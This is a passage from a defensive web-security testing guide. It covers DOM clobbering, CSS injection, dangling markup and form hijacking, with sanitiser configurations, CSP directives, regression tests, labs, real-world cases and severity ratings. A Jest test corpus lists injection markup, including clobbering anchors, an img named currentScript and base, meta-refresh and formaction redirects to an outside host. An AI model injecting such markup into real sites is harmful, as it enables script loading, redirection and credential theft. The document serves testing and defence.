COMMENT_TAGS = {"p", "br", "b", "i", "em", "strong", "ul", "ol", "li", "blockquote", "code", "pre", "a"}
COMMENT_ATTRS = {"a": {"href"} }  # no id, name, style

def clean_comment_html(html: str) -> str:
    return nh3.clean(
        html,
        tags=COMMENT_TAGS,
        attributes=COMMENT_ATTRS,
        url_schemes={"https", "mailto"},
        link_rel="noopener noreferrer nofollow",
    )

class Comment(models.Model):
    body_html = models.TextField()

    def save(self, *args, **kwargs):
        self.body_html = clean_comment_html(self.body_html)
        super().save(*args, **kwargs)
```

If `id` attributes are needed (headings in documentation pages), allow them and pass `id_prefix="user-content-"` so they cannot collide with application names. nh3 also has `filter_style_properties`, which only matters if you allow `style`.

**Spring (OWASP Java HTML Sanitizer).** Policies only allow what you name, so `id`, `name`, `style` and form elements stay out unless you add them:

```java
import org.owasp.html.HtmlPolicyBuilder;
import org.owasp.html.PolicyFactory;
import org.springframework.stereotype.Component;

@Component
public class CommentSanitizer {
    private static final PolicyFactory POLICY = new HtmlPolicyBuilder()
        .allowElements("p", "br", "b", "i", "em", "strong", "ul", "ol", "li", "blockquote", "code", "pre", "a")
        .allowUrlProtocols("https", "mailto")
        .allowAttributes("href").onElements("a")
        .requireRelNofollowOnLinks()
        .toFactory();

    public String clean(String untrusted) {
        return POLICY.sanitize(untrusted);
    }
}
```

**Laravel (Symfony HtmlSanitizer).** The `symfony/html-sanitizer` component works in Laravel through Composer. Start from an empty configuration and add elements one by one, rather than from a broad preset:

```php
// app/Providers/AppServiceProvider.php
use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

public function register(): void
{
    $this->app->singleton('comment.sanitizer', function () {
        $config = (new HtmlSanitizerConfig())
            ->allowElement('p')->allowElement('br')->allowElement('strong')->allowElement('em')
            ->allowElement('ul')->allowElement('ol')->allowElement('li')
            ->allowElement('blockquote')->allowElement('code')->allowElement('pre')
            ->allowElement('a', ['href'])
            ->allowLinkSchemes(['https', 'mailto'])
            ->forceAttribute('a', 'rel', 'noopener noreferrer nofollow');

        return new HtmlSanitizer($config);
    });
}

// In the controller
$clean = app('comment.sanitizer')->sanitize((string) $request->input('body_html'));
```

Whichever library you use, render the stored, sanitised HTML without further processing, and run the same sanitiser on every path that accepts that field (web form, API, import, email-in).

### CSS values and theming

**Validate the format, then write through the CSSOM.** A brand colour is a hex value, so validate it as one on the server:

```python
# Django
from django.core.validators import RegexValidator
hex_colour = RegexValidator(r"^#[0-9a-fA-F]{6}$", "Use a six-digit hex colour.")
```

```java
// Spring (Bean Validation)
public record ThemeRequest(@Pattern(regexp = "^#[0-9a-fA-F]{6}$") String brandColour) {}
```

```php
// Laravel
$request->validate(['brand_colour' => ['required', 'regex:/^#[0-9a-fA-F]{6}$/']]);
```

```javascript
// Express
const HEX = /^#[0-9a-fA-F]{6}$/;
if (!HEX.test(req.body.brandColour)) return res.status(422).json({ error: "invalid colour" });
```

On the client, apply validated values through the CSSOM rather than by building a stylesheet string. `setProperty` takes one value for one property; a value containing `;` or `}` cannot add rules, it is simply invalid:

```javascript
document.documentElement.style.setProperty("--brand", theme.brandColour);
```

Fonts and images: choose from a list (font names from a fixed set, images uploaded to your own storage and referenced by ID), never free text inside `url()` or `font-family`.

**Custom CSS features.** If customers can upload CSS, either render it only on their own pages on a separate origin, or parse it with a real CSS parser and allow-list properties and values: no `url()` to external hosts, no `@import`, no `@font-face` from external sources, no `position: fixed` or large `z-index` on pages that host other users' content. Do not try to sanitise CSS with regular expressions.

**Inline styles in sanitised HTML.** Prefer removing `style` entirely and offering formatting through allowed classes (`class` values from a fixed set, which the sanitiser can enforce: nh3 has `allowed_classes`).

### CSP directives for scriptless attacks

A policy that closes the channels this note relies on (adjust hosts to the application):

```http
Content-Security-Policy: default-src 'self'; script-src 'nonce-r4nd0m' 'strict-dynamic'; style-src 'self' 'nonce-r4nd0m'; style-src-attr 'none'; img-src 'self' https://cdn.example.com; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
```

- `style-src` with a nonce allows the application's own `style` elements and stylesheets and blocks injected ones; `style-src-attr 'none'` blocks inline `style` attributes, which nonces cannot cover. If the application itself needs inline style attributes, user content is then the only reason to sanitise `style` out.
- `img-src` and `font-src` restricted to known hosts close the request channel for CSS exfiltration and image-based dangling markup.
- `base-uri 'none'` (or `'self'` if the application uses its own `base`) and `form-action 'self'` must be explicit; neither falls back to `default-src`.
- `'strict-dynamic'` makes the clobbering gadgets in [Clobberable lookups in application code](#clobberable-lookups-in-application-code) matter more, because scripts created by trusted code are trusted. Keep it if it simplifies the policy, but then the JavaScript hygiene above is not optional.

Framework notes: **helmet** for Express sets `base-uri 'self'`, `form-action 'self'`, `object-src 'none'` and `script-src-attr 'none'` by default, but its default `style-src` is `'self' https: 'unsafe-inline'`, so override `style-src` on pages that render user HTML. **Django 6.0** added built-in CSP (`django.middleware.csp.ContentSecurityPolicyMiddleware`, the `SECURE_CSP` setting and `CSP.NONCE` from `django.utils.csp`). **Spring Security** sets the header with `headers(h -> h.contentSecurityPolicy(csp -> csp.policyDirectives("...")))`. In **Laravel**, set it in a middleware or with a CSP package. Design detail, nonce handling and reporting are in [Content Security Policy and browser security headers](/web/web-content-security-policy-headers/).

### Regression tests

Write the tests that would have caught each finding:

- **Sanitiser contract tests.** For each rendering path, run the real sanitiser on a fixed corpus and assert the output: no `style`, `form`, `input`, `button`, `base`, `meta`; `id` and `name` absent or prefixed; `href` only `https:` or `mailto:`.

  ```javascript
  // Jest + jsdom (illustrative)
  import { sanitizeComment } from "../src/sanitize";

  const CORPUS = [
    '<a id="widgetConfig"></a><a id="widgetConfig" name="cdnBase" href="https://example.org/x">x</a>',
    '<img name="currentScript" src="https://example.org/x.js">',
    '<form id="f"><input name="attributes"></form>',
    '<div style="position:fixed">x</div><style>p{color:red}</style>',
    '<base href="https://example.org/"><meta http-equiv="refresh" content="0;url=https://example.org/">',
    '<button form="account-form" formaction="https://example.org/">x</button>',
  ];

  test.each(CORPUS)("sanitised output has no clobbering or scriptless primitives: %s", (dirty) => {
    const out = document.createElement("div");
    out.innerHTML = sanitizeComment(dirty);
    for (const el of out.querySelectorAll("[id],[name]")) {
      for (const attr of ["id", "name"]) {
        const v = el.getAttribute(attr);
        if (v !== null) expect(v.startsWith("user-content-")).toBe(true);
      }
    }
    expect(out.querySelector("style,form,input,button,base,meta,[style],[formaction]")).toBeNull();
  });
  ```

- **Browser tests for globals.** A Playwright test that stores each corpus item through the real API as a test user, opens the page as a second test user, and asserts `typeof window.widgetConfig === "undefined"` (or whatever names the application reads) and that `document.currentScript` is not an image.
- **Header tests.** Fetch representative pages, including an error page, and assert `base-uri`, `form-action`, `object-src`, `style-src` and `img-src`.
- **Theme validation tests.** Each theme field rejects `;`, `{`, `}`, `<` and `url(`.
- **Dependency gates.** Fail the build on known advisories for DOMPurify, sanitize-html, your Markdown renderer and your bundler.

## Practice labs

Labs are where you can run the full techniques the client rules exclude, such as multi-level clobbering into script execution and dangling-markup capture to an exploit server. Keep the habit of writing down which sanitiser setting or CSP directive would have stopped each step.

**PortSwigger Web Security Academy** (free):

- [Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering): two anchors with the same `id` and a `name` turn a `window.x || {}` default into a script-capable value (tests 3 and 4).
- [Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters): a form control named `attributes` defeats a client-side filter ([Clobbering that defeats filters and sanitisers](#clobbering-that-defeats-filters-and-sanitisers)).
- [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack): data capture when the CSP blocks script (test 7). The lab requires sending captured data to the exploit server, which is exactly what you do not do on client systems.
- The topic pages [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) and [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) explain the background for both.

**Other practice resources:**

- [domclob.xyz](https://domclob.xyz/), from the authors of the IEEE S&P 2023 study, has browser tests for clobbering markups, a payload generator and a wiki of vulnerable code patterns. Use it in your own browser to see which markups work in which engine.
- The [DOMPurify demo](https://cure53.de/purify) shows what a given input looks like after sanitising, useful for checking configurations from test 2 before you store anything on a client system.
- OWASP Juice Shop, crAPI and VAmPI do not have challenges dedicated to DOM clobbering or CSS injection at the time of writing; for scriptless practice, the PortSwigger labs above are the closest fit.

## Real-world cases

- **DOM clobbering XSS in Gmail's AMP4Email (Google, 2019).** Michał Bentkowski found that the AMP4Email validator allowed `id` attributes and blocked some reserved values such as `AMP`, but not `AMP_MODE`. An anchor with that `id` made AMP build a script URL with `undefined` in its path, which showed that the extension loader read properties of `AMP_MODE`. Clobbering `AMP_MODE.test` and `AMP_MODE.localDev` (to make them truthy) and `testLocation.protocol` (an anchor whose `href` became the start of the URL), all with same-`id` anchor pairs, gave him control of the full URL of a script the page created itself. In the real deployment AMP's CSP stopped the script from executing and he did not bypass it; he notes that Google's programme paid in full anyway. Reported 15 August 2019, confirmed fixed 12 October 2019, published 18 November 2019. The original Securitum URL now redirects; an [archived copy of the write-up](http://web.archive.org/web/20250905203034/https://research.securitum.com/xss-in-amp4email-dom-clobbering/) is available. It is the reference case for tests 3 and 4.
- **Bundler runtime gadgets (webpack, Vite, Rollup, 2024).** webpack's `AutoPublicPathRuntimeModule` read `document.currentScript.src` to decide where lazy-loaded chunks come from, so an injected `img` with `name="currentScript"` redirected chunk loading to another host. The advisory reports real-world exploitation in Canvas LMS. Fixed in webpack 5.94.0. Vite and Rollup had the same class of gadget for `import.meta.url` in `cjs`, `iife` and `umd` output. All three advisories map the issue to CWE-79. [GHSA-4vvj-4cpr-p986 / CVE-2024-43788](https://github.com/advisories/GHSA-4vvj-4cpr-p986), [GHSA-64vr-g452-qvp3 / CVE-2024-45812](https://github.com/advisories/GHSA-64vr-g452-qvp3), [GHSA-gcx4-mw62-g8wm / CVE-2024-47068](https://github.com/advisories/GHSA-gcx4-mw62-g8wm). These are the reason test 3 includes the libraries.
- **Password theft from infosec.exchange without bypassing CSP (Mastodon, 2022).** Gareth Heyes found that the instance's HTML mode kept `title` attributes and that a `:verified:` emoji replacement inserted markup with quotes inside them, allowing an attribute breakout. With script blocked by CSP, he injected form inputs that Chrome's password manager autofilled, hid them with an existing CSS class (inline styles were blocked), and used spoofed toolbar buttons to submit them off-site. Reported 8 November 2022; patched in the Glitch fork on 10 November, with Mastodon 4.0.1, 3.5.5 and 3.4.10 fixing the replacement in core. He points to `form-action` as the directive that would have prevented it. [PortSwigger Research](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). This is test 9's scenario.
- **CSS-based input-value exfiltration in Swagger UI (CVE-2019-17495).** Swagger UI before 3.23.11 would load an OpenAPI document named in a URL parameter, and researchers from The Tarantula Team and VinCSS showed that a `style` element with `@import` inside that document, combined with relative path overwrite, could read an input's value (a CSRF token in their demonstration) one character at a time. The fix release describes it as a security fix for "CSS-based input field value exfiltration" and mitigates sequential `@import` chaining. [Release notes v3.23.11](https://github.com/swagger-api/swagger-ui/releases/tag/v3.23.11), [researchers' write-up](https://github.com/tarantula-team/CSS-injection-in-Swagger-UI), [GHSA-c427-hjc3-wrfw](https://github.com/advisories/GHSA-c427-hjc3-wrfw). It is the embedded-document case in [CSS in emails and embedded documents](#css-in-emails-and-embedded-documents).

More write-ups are collected in [Bug Bounty Writeups](/bug-bounty-writeups/).

## Rating findings

Rate scriptless findings by **what the primitive reaches**, not by the absence of script. A clobbering gadget that loads a script is XSS; CSS injection with an open channel on a page full of tokens is data exposure; an overlay on a payment page is a phishing primitive on a trusted origin. The factors that move severity: who can inject (anyone, any registered user, a specific role), who renders it (the author only, members of a workspace, all users, staff), what the page holds (credentials, tokens, personal or financial data, sensitive actions), which CSP directives close the channel, and which browsers it works in.

**Scope.** Series convention for client-side findings (see [Rating client-side findings](/web/web-client-side-testing-guide/#rating-client-side-findings)): Scope Changed only when attacker script runs in the vulnerable origin, as with XSS. This follows the FIRST CVSS v3.1 examples, where reflected XSS in WP Mail (CVE-2017-5942) is scored `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (6.1) because the flaw is on the server and the impact is in the browser. Everything else here is Scope Unchanged: content spoofing only changes what the application itself displays, clobbered links and meta refresh only navigate the victim, and CSS, dangling-markup and form-hijacking captures read the application's own data through the browser. User Interaction is Required for everything here, because a victim has to view the content.

| Finding | Typical severity | Example CVSS v3.1 vector | Reasoning |
|---|---|---|---|
| DOM clobbering gadget leads to script execution, stored in content other users view | Medium to High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (5.4); `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (8.7) where the session can change email, password or payment details, or victims include admins | It is stored XSS reached through markup; rate it like the XSS it becomes |
| Clobbering gadget whose script load is blocked only by CSP | Low | none | Report the gadget and the single control: no execution today; one policy change (adding a host, `'strict-dynamic'`) makes it XSS |
| Clobbered value used as a navigation target | Low | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N` (3.5) | Stored open redirect from a trusted page (CWE-601); navigation only, so Scope Unchanged; rate as XSS if a `javascript:` URL reaches the sink |
| Clobbering flips a client-side check; server enforces correctly | Info to Low | none | No server-side gap; report the code pattern (ASVS `v5.0.0-3.2.3`) |
| Vulnerable bundler or sanitiser version, no injection point found | Info to Low | none | Dependency finding (A03:2025); rate as XSS if a reachable gadget and injection point exist |
| CSS injection with an open request channel on pages that render secrets or personal data in attributes | Medium | `CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N` (4.8) | `AC:H` because extraction depends on page structure, timing and chained requests; `C:H` when the readable value is a credential or token; Scope Unchanged because the data is read through the browser without script in the origin; High for credentials or API keys |
| CSS injection used for overlays and content spoofing on pages other users see | Low to Medium | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N` (3.5) | Integrity of what the application displays; raise for payment, bank-detail or login pages where a fake form is credible |
| Dangling markup capturing a CSRF token or personal data, with an open channel | Medium | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N` (5.3); `C:L` (3.1) when the captured content is low-sensitivity | Reflected and unauthenticated in the usual case; `AC:H` because the next quote and the channel decide what is captured and browser mitigations vary |
| Base tag injection moving relative scripts to another host | Medium to High | — | Rate as stored XSS (5.4 to 8.7): the application's own (nonce-carrying) script tags load attacker script |
| Meta refresh injection in stored content | Low | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N` (3.5) | Clickless open redirect from a trusted page; navigation only, so Scope Unchanged, and Low like any redirect unless chained |
| Form hijacking that captures password-manager autofill | High | `CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N` (6.4) | Rated above the score: credentials of every viewer whose browser autofills; `AC:H` because autofill behaviour depends on browser and settings |
| `formaction` hijack of a non-credential form | Low to Medium | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N` (3.5) | Victim must click; impact is what that form carries |
| Missing `base-uri`, missing `form-action` or permissive `style-src` with no injection point | Info to Low | none | Hardening against ASVS `v5.0.0-3.4.3`; cite it alongside any injection finding it worsens |
| Sanitiser keeps `id`, `name` or `style` with no gadget, no channel and no sensitive page | Info | none | Recommendation: namespace isolation or removal |

When you report, give: the injection point and rendering path, the markup that survived (from test 1), the reference or CSS context, the sink and what reached it (console output, the single collaborator request, or the local DOM capture), the CSP directives that did or did not stop it, the browsers tested, and the data at risk described by type. State that no page data was sent anywhere during testing and that all stored markers were removed.

## Mapping

| Test | WSTG | ASVS 5.0 | CWE | OWASP Top 10 |
|---|---|---|---|---|
| GT-WEB-CLOB-1 | WSTG-CLNT-03, WSTG-CLNT-16, WSTG-CLNT-05 | v5.0.0-1.3.1, v5.0.0-1.3.5 | CWE-79 | A05:2025 |
| GT-WEB-CLOB-2 | WSTG-CLNT-16, WSTG-CLNT-03, WSTG-CLNT-05 | v5.0.0-1.3.1, v5.0.0-1.3.5, v5.0.0-3.2.3 | CWE-79; CWE-1395 for vulnerable versions | A05:2025; A03:2025 for versions |
| GT-WEB-CLOB-3 | WSTG-CLNT-16 | v5.0.0-3.2.3 | CWE-1287 (code pattern), CWE-79 | A05:2025 |
| GT-WEB-CLOB-4 | WSTG-CLNT-16, WSTG-CLNT-04 for redirects | v5.0.0-3.2.3 | CWE-79; CWE-601 | A05:2025; A01:2025 for CWE-601 |
| GT-WEB-CLOB-5 | WSTG-CLNT-05 | v5.0.0-1.3.5, v5.0.0-1.2.1 | CWE-79; CWE-116 for missing CSS-context encoding; CWE-451 for spoofing | A05:2025; A06:2025 for CWE-451 |
| GT-WEB-CLOB-6 | WSTG-CLNT-05 | v5.0.0-1.3.5, v5.0.0-3.4.3 | CWE-79 | A05:2025 |
| GT-WEB-CLOB-7 | WSTG-CLNT-03 | v5.0.0-1.2.1 | CWE-79 | A05:2025 |
| GT-WEB-CLOB-8 | WSTG-CLNT-03, WSTG-CLNT-04 | v5.0.0-3.4.3 | CWE-79; CWE-601 for meta refresh | A05:2025; A01:2025 for CWE-601 |
| GT-WEB-CLOB-9 | WSTG-CLNT-03 | v5.0.0-3.4.3, v5.0.0-1.3.1 | CWE-79; CWE-451 | A05:2025; A06:2025 for CWE-451 |
| GT-WEB-CLOB-10 | WSTG-CLNT-05, WSTG-CLNT-16, WSTG-CLNT-03 | v5.0.0-3.4.3 | none on its own (supports the findings above) | A02:2025 |

ASVS levels: `v5.0.0-3.2.3` L3 (avoid DOM clobbering through explicit declarations, strict type checks, no globals on `document`, and namespace isolation); `v5.0.0-1.3.5` L2 (sanitise or disable user-supplied scriptable content such as Markdown, CSS, XSL and BBCode); `v5.0.0-1.3.1` L1 (sanitise WYSIWYG and similar HTML with a well-known library); `v5.0.0-1.2.1` L1 (context-relevant output encoding, CSS and HTML attributes included); `v5.0.0-3.4.3` L2 (CSP with at least `object-src 'none'` and `base-uri 'none'`, plus an allow-list or nonces/hashes; per-response nonces or hashes at L3); `v5.0.0-3.2.2` L1 (render text with safe functions such as `textContent`) applies wherever the content did not need to be HTML at all; `v5.0.0-3.5.4` L2 (separate hostnames) underpins the separate content origin advice.

CWE choice: **CWE-79** (*Improper Neutralization of Input During Web Page Generation*, Base, mapping usage "Allowed") is the default for all of these, because the weakness is user input reaching a generated page without neutralisation, whether or not the outcome is script. The GitHub advisories for the bundler gadgets and Swagger UI's CSS exfiltration (CVE-2019-17495) also use CWE-79. Use **CWE-601** for clobbering or meta refresh that ends in a redirect. **CWE-1287** (*Improper Validation of Specified Type of Input*, Base) fits the JavaScript root cause in grey-box reports (code that accepts an element where it expects a string or object); it is our mapping choice, as MITRE has no DOM-clobbering-specific entry. **CWE-451** (UI misrepresentation, Class, "Allowed-with-Review") describes overlay and spoofing outcomes. **CWE-116** (improper encoding or escaping, Class, "Allowed-with-Review") is for theme values written into CSS without CSS-context encoding. Avoid **CWE-74**: MITRE marks it "Discouraged" for mapping because it is too high-level. `A05:2025` is Injection in the OWASP Top 10:2025, which lists CWE-79, CWE-74 and CWE-116 among its CWEs; CWE-601 sits in `A01:2025` Broken Access Control, CWE-451 in `A06:2025` Insecure Design, vulnerable components in `A03:2025` Software Supply Chain Failures, and missing security headers in `A02:2025` Security Misconfiguration.

## References

**OWASP**

- WSTG: [Testing for DOM Clobbering (WSTG-CLNT-16)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/11-Client-side/16-DOM_Clobbering), [Testing for CSS Injection (WSTG-CLNT-05)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/11-Client-side/05-CSS_Injection), [Testing for HTML Injection (WSTG-CLNT-03)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/11-Client-side/03-HTML_Injection)
- ASVS 5.0: [V3 Web Frontend Security](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x12-V3-Web-Frontend-Security.md), [V1 Encoding and Sanitization](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x10-V1-Encoding-and-Sanitization.md)
- Top 10:2025: [A05:2025 Injection](https://top10.owasp.org/2025/A05_2025-Injection/), [A01:2025 Broken Access Control](https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/), [A02:2025 Security Misconfiguration](https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/), [A03:2025 Software Supply Chain Failures](https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/), [A06:2025 Insecure Design](https://top10.owasp.org/2025/A06_2025-Insecure_Design/)
- Cheat Sheets: [DOM Clobbering Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html), [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html), [HTML5 Security](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)

**CWE**

- [CWE-79](https://cwe.mitre.org/data/definitions/79.html), [CWE-601](https://cwe.mitre.org/data/definitions/601.html), [CWE-1287](https://cwe.mitre.org/data/definitions/1287.html), [CWE-451](https://cwe.mitre.org/data/definitions/451.html), [CWE-116](https://cwe.mitre.org/data/definitions/116.html), [CWE-74](https://cwe.mitre.org/data/definitions/74.html), [CWE-1395](https://cwe.mitre.org/data/definitions/1395.html)

**Research**

- Heiderich, Niemietz, Schuster, Holz, Schwenk: *Scriptless Attacks: Stealing the Pie Without Touching the Sill*, ACM CCS 2012, [doi:10.1145/2382196.2382276](https://doi.org/10.1145/2382196.2382276)
- Khodayari, Pellegrino: *It's (DOM) Clobbering Time: Attack Techniques, Prevalence, and Defenses*, IEEE S&P 2023, [paper (PDF)](https://scnps.co/papers/sp23_domclob.pdf), companion site [domclob.xyz](https://domclob.xyz/)
- Gareth Heyes (PortSwigger Research): [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back), [Bypassing CSP via DOM clobbering](https://portswigger.net/research/bypassing-csp-via-dom-clobbering), [Blind CSS Exfiltration](https://portswigger.net/research/blind-css-exfiltration), [Evading CSP with DOM-based dangling markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup), [Using form hijacking to bypass CSP](https://portswigger.net/research/using-form-hijacking-to-bypass-csp), [Stealing passwords from infosec Mastodon without bypassing CSP](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)
- Michał Bentkowski: XSS in AMP4Email via DOM clobbering ([archived copy](http://web.archive.org/web/20250905203034/https://research.securitum.com/xss-in-amp4email-dom-clobbering/))
- X-C3LL: [CSS Injection Primitives](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/); Mike Gualtieri: [Stealing Data With CSS: Attack and Defense](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense)
- Chrome Platform Status: [Blocking resources whose URLs contain both newline and `<` characters](https://chromestatus.com/feature/5735596811091968) (Chrome 61), [Replace dangling markup in target name to `_blank`](https://chromestatus.com/feature/5073969773805568) (Chrome 119)

**PortSwigger**

- [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering), [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup), [Content security policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy), [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [DOM Invader: DOM clobbering](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-clobbering), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)

**Standards and browser documentation**

- HTML Living Standard: [Named access on the Window object](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object), [Document named properties](https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem), [meta refresh](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv-refresh)
- [Content Security Policy Level 3](https://www.w3.org/TR/CSP3/); MDN: [`style-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/style-src), [`style-src-attr`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/style-src-attr), [`base-uri`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/base-uri), [`form-action`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/form-action), [`base` element](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/base), [`meta http-equiv`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/http-equiv), [`button` formaction](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/button#formaction), [`unicode-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/At-rules/@font-face/unicode-range), [`Object.hasOwn`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn), [`document.currentScript`](https://developer.mozilla.org/en-US/docs/Web/API/Document/currentScript)
- FIRST: [CVSS v3.1 examples](https://www.first.org/cvss/v3.1/examples), [CVSS v3.1 user guide](https://www.first.org/cvss/v3.1/user-guide)

**Libraries, frameworks and tools**

- [DOMPurify](https://github.com/cure53/DOMPurify) ([security advisories](https://github.com/cure53/DOMPurify/security/advisories), [demo](https://cure53.de/purify)); [sanitize-html](https://github.com/apostrophecms/apostrophe/tree/main/packages/sanitize-html); [nh3](https://nh3.readthedocs.io/en/latest/); [OWASP Java HTML Sanitizer](https://github.com/OWASP/java-html-sanitizer); [Symfony HtmlSanitizer](https://symfony.com/doc/current/html_sanitizer.html)
- CSP in frameworks: [helmet](https://helmetjs.github.io/), [Django Content Security Policy](https://docs.djangoproject.com/en/stable/ref/csp/), [Spring Security headers](https://docs.spring.io/spring-security/reference/servlet/exploits/headers.html); [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- webpack [`output.publicPath`](https://webpack.js.org/configuration/output/#outputpublicpath); advisories [GHSA-4vvj-4cpr-p986](https://github.com/advisories/GHSA-4vvj-4cpr-p986), [GHSA-64vr-g452-qvp3](https://github.com/advisories/GHSA-64vr-g452-qvp3), [GHSA-gcx4-mw62-g8wm](https://github.com/advisories/GHSA-gcx4-mw62-g8wm), [GHSA-c427-hjc3-wrfw](https://github.com/advisories/GHSA-c427-hjc3-wrfw)
- ESLint: [no-implicit-globals](https://eslint.org/docs/latest/rules/no-implicit-globals), [no-restricted-properties](https://eslint.org/docs/latest/rules/no-restricted-properties); [Playwright](https://playwright.dev/); [interactsh](https://github.com/projectdiscovery/interactsh)
